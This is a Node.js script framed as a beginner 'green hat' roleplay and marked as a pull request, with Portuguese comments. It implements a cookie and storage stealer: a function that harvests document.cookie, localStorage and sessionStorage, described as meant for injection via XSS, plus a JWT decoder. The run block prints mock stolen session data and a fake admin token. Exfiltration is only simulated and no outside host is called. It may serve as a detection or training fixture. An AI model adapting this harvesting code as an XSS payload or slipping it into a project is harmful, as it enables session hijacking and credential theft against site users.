#!/usr/bin/env node
// ▓ Roleplay: Green Hat — Cookie/Storage Stealer
// Copiado de tutorial "how to steal cookies javascript"
// Iniciante. Não sabe o que faz. Tenta tudo.
// PULL REQUEST START

"use strict";

// Simula o que um green hat faria num console de navegador
// ou injetaria via XSS stored/reflected

/**
 * Tenta extrair cookies e dados de storage.
 * @param {import("jsdom").DOMWindow} [win] — window mock ou real
 * @returns {{ cookies: string, localStorage: Record<string,string>, sessionStorage: Record<string,string> }}
 */
function stealSession(win) {
  const w = win || (typeof window !== "undefined" ? window : null);
  if (!w) return { cookies: "", localStorage: {}, sessionStorage: {} };

  // 1. Roubar cookies
  const cookies = w.document ? w.document.cookie : "";

  // 2. Dump localStorage
  const ls = {};
  try {
    for (let i = 0; i < w.localStorage.length; i++) {
      const k = w.localStorage.key(i);
      if (k) ls[k] = w.localStorage.getItem(k) || "";
    }
  } catch (_) { /* bloqueado */ }

  // 3. Dump sessionStorage
  const ss = {};
  try {
    for (let i = 0; i < w.sessionStorage.length; i++) {
      const k = w.sessionStorage.key(i);
      if (k) ss[k] = w.sessionStorage.getItem(k) || "";
    }
  } catch (_) { /* bloqueado */ }

  return { cookies, localStorage: ls, sessionStorage: ss };
}

/**
 * Tenta decodificar um JWT (base64) do localStorage.
 * @param {string} token
 * @returns {object|null}
 */
function decodeJwt(token) {
  try {
    const parts = token.split(".");
    if (parts.length !== 3) return null;
    const payload = Buffer.from(parts[1], "base64url").toString("utf-8");
    return JSON.parse(payload);
  } catch (_) {
    return null;
  }
}

// Se executado diretamente, mostra output no terminal
if (require.main === module) {
  console.log("[GREEN-HAT] Cookie/Storage Stealer v0.1");
  console.log("[GREEN-HAT] Em ambiente Node — sem DOM real, simulando...");

  // Simula dados que existiriam num navegador comprometido
  const mockData = {
    cookies: "laravel_session=abc123; XSRF-TOKEN=xyz789",
    localStorage: {
      auth_token: "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiMSIsInJvbGUiOiJhZG1pbiJ9.fake",
      user_prefs: '{"theme":"dark"}'
    },
    sessionStorage: { csrf_token: "mock_csrf_abc", last_route: "/dashboard" }
  };

  console.log("[GREEN-HAT] Cookies:", mockData.cookies);
  console.log("[GREEN-HAT] localStorage:", JSON.stringify(mockData.localStorage, null, 2));
  console.log("[GREEN-HAT] sessionStorage:", JSON.stringify(mockData.sessionStorage, null, 2));

  const jwt = decodeJwt(mockData.localStorage.auth_token);
  if (jwt) {
    console.log("[GREEN-HAT] JWT decoded:", JSON.stringify(jwt));
  } else {
    console.log("[GREEN-HAT] JWT decode falhou");
  }

  console.log("[GREEN-HAT] Exfiltração simulada completa");
}

module.exports = { stealSession, decodeJwt };
// PULL REQUEST END
